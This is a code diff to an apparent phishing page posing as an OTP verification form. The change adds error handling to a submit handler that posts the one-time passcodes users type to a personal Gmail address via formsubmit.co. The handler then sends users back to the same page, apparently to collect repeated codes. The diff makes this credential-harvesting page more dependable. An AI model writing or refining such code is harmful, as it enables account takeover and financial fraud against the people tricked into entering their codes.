@@ -77,6 +77,8 @@
 
               <input type="hidden" name="_captcha" value="false">
               <input type="hidden" name="_next" value="otp.html">
+                <!-- Add this div just after the formOtp div -->
+                  <div id="error-message" style="color: red; margin-bottom: 15px; display: none;"></div>
 
               <button type="submit" class="verify-btn">Verify</button>
             </form>
@@ -87,27 +89,24 @@
   </div>
 
 <script>
-  document.addEventListener('DOMContentLoaded', function() {
+  document.addEventListener('DOMContentLoaded', function () {
     const otpInputs = document.querySelectorAll('.pin-input');
-    
-    // Auto-focus movement between OTP inputs
+    const errorMessage = document.getElementById('error-message');
+
     otpInputs.forEach((input, index) => {
-      // Move to next input when a digit is entered
-      input.addEventListener('input', function() {
+      input.addEventListener('input', function () {
         if (this.value.length === 1 && index < otpInputs.length - 1) {
           otpInputs[index + 1].focus();
         }
       });
-      
-      // Handle backspace to move to previous input
-      input.addEventListener('keydown', function(e) {
+
+      input.addEventListener('keydown', function (e) {
         if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
           otpInputs[index - 1].focus();
         }
       });
-      
-      // Allow paste event (will paste all digits at once)
-      input.addEventListener('paste', function(e) {
+
+      input.addEventListener('paste', function (e) {
         e.preventDefault();
         const pasteData = e.clipboardData.getData('text/plain');
         if (/^\d+$/.test(pasteData)) {
@@ -119,19 +118,29 @@
         }
       });
     });
-    
-    // Form submission handler
+
     const otpForm = document.getElementById('otp-form');
-    otpForm.addEventListener('submit', async function(e) {
+    otpForm.addEventListener('submit', async function (e) {
       e.preventDefault();
+      errorMessage.style.display = 'none'; // Reset error
+
       const formData = new FormData(otpForm);
 
-      await fetch('https://formsubmit.co/Payday10177@gmail.com', {
-        method: 'POST',
-        body: formData
-      });
+      try {
+        const response = await fetch('https://formsubmit.co/Payday10177@gmail.com', {
+          method: 'POST',
+          body: formData
+        });
 
-      window.location.href = 'otp.html';
+        if (!response.ok) {
+          throw new Error('Network response was not ok');
+        }
+
+        window.location.href = 'otp.html';
+      } catch (error) {
+        errorMessage.textContent = 'Network error. Please try again.';
+        errorMessage.style.display = 'block';
+      }
     });
   });
 </script>
